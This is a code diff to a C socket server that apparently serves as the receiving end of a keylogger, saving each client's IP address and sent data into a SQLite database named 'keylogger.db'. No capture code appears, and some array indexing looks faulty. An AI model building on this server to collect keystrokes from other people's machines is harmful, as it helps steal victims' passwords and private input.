@@ -1,6 +1,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include "server.h"
+#include "../database/database.h"
 
 int			init_socket(nfds_t *reuse)
 {
@@ -24,7 +25,7 @@ int			init_socket(nfds_t *reuse)
   return (sock);
 }
 
-void		server(struct sockaddr_in *addr) {
+void server(struct sockaddr_in *addr, sqlite3 *db) {
   socklen_t socklen= sizeof(struct sockaddr_in);
   int		sock_fd;
   int		io= 1;
@@ -32,6 +33,7 @@ void		server(struct sockaddr_in *addr) {
   nfds_t	reuse = 1;
   char		buffer[BUFFSIZE];
   struct pollfd fds[200];
+  int id= 1;
 
   sock_fd = init_socket(&reuse);
   memset(fds, 0, sizeof(fds));
@@ -72,6 +74,8 @@ void		server(struct sockaddr_in *addr) {
 	  printf("%s\n", inet_ntoa(addr[i].sin_addr));
           if (new_fd == -1)
              break;
+	  create_clients(db, id, inet_ntoa(addr[i].sin_addr), buffer);
+	  id++;
           printf("new client fd = %d\n", new_fd);
 	  fds[reuse].fd = new_fd;
           fds[reuse].events = POLLIN;
@@ -83,6 +87,8 @@ void		server(struct sockaddr_in *addr) {
 	  fcntl(fds[i].fd, F_SETFL, O_NONBLOCK);
 	  save_data("\n\n");
 	  save_data(buffer);
+	  printf("%s %d\n", inet_ntoa(addr[new_fd].sin_addr), new_fd);
+	  add_data(db, buffer, inet_ntoa(addr[i].sin_addr));
 	  printf("Data sent: %s\n", buffer);
 	  memset(buffer, 0, 256);
 	}
@@ -102,9 +108,18 @@ void sigint_handler(int sig) {
 }
 
 int main() {
+  sqlite3 *keylogger;
+  int res= sqlite3_open("../database/keylogger.db", &keylogger);
+  if(res) {
+    perror("can't succeed\n");
+    exit(0);
+  }
+  else
+    printf("connection success\n");
   struct sockaddr_in *addr= calloc(100, sizeof(struct sockaddr_in));
   signal(SIGINT, sigint_handler);
-  server(addr);
+  server(addr, keylogger);
   free(addr);
+  sqlite3_close(keylogger);
   return 0;
 }
